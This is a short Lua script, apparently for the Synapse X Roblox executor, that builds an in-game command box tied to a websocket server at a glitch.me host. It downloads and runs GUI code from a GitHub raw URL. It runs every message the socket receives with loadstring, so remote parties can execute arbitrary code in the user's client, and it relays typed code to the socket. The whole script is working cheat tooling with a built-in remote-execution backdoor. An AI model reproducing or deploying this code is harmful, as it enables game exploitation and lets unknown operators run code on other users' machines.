local socket = syn.websocket.connect("ws://prickly-poised-veil.glitch.me")
repeat wait() until socket

local gui = loadstring(game:HttpGet("https://raw.githubusercontent.com/dreadmania11352/lolololololol/main/gui"))()
gui.Parent = game.CoreGui
local box = gui.Frame.Frame.TextBox
box.Font = Enum.Font.Code

socket.OnMessage:Connect(function(msg)
    loadstring(msg)()
end)

local function runsc(sc)
   socket:Send(sc) 
end

game:GetService("UserInputService").InputEnded:Connect(function(inp, proc)
    if not proc then
        if inp.KeyCode == Enum.KeyCode.R then
            gui.Enabled = not gui.Enabled
        end
    end
end)

box.FocusLost:Connect(function(ent)
    if ent then
         runsc(box.Text)
    end
end)
